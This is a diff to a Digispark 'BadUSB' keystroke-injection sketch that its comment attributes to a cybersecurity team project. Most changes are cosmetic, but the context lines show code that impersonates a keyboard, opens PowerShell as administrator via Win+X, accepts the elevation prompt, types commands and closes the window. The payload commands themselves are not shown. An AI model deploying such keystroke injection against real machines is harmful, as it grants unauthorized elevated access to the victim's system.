@@ -1,4 +1,4 @@
-#include "DigiKeyboard.h"
+#include <DigiKeyboard.h>
 #define KEY_UP 0x52
 #define KEY_DOWN 0x51
 #define KEY_LEFT 0x50
@@ -16,19 +16,6 @@
   PS = PowerShell
 */
 
-
-void enterPowerShell() {
-  // Accessing PowerShell
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT); // opens the execute popup
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.sendKeyStroke(KEY_A); // selects "PowerShell (Admin)"
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.sendKeyStroke(KEY_LEFT); // selects "yes"
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.sendKeyStroke(KEY_ENTER); // hits enter
-}
-
 void setup() {
   DigiKeyboard.update();
 
@@ -38,9 +25,12 @@ void setup() {
   DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_A); // selects "PowerShell (Admin)"
   DigiKeyboard.delay(1000);
-  DigiKeyboard.sendKeyStroke(KEY_LEFT); // selects "yes"
+  DigiKeyboard.sendKeyStroke(KEY_LEFT); // selects "yes")
+
   DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_ENTER); // hits enter
+
+
 
   // brings focus to the PS window
   DigiKeyboard.delay(1000);
@@ -92,7 +82,7 @@ void setup() {
   DigiKeyboard.delay(1000);
   DigiKeyboard.println("exit");  // closes the PowerShell window
 
-  // DEVELOPED BY MARCOS RODRIGUEZ (MIKE ROBLES) FOR TEAM ECHO
+  // DEVELOPED BY MARCOS RODRÍGUEZ NÚÑEZ (MIKE ROBLES) FOR TEAM ECHO
   // WATCHDOGS CYBERSECURITY - BADUSB PROJECT
   // JANUARY 2024
 }
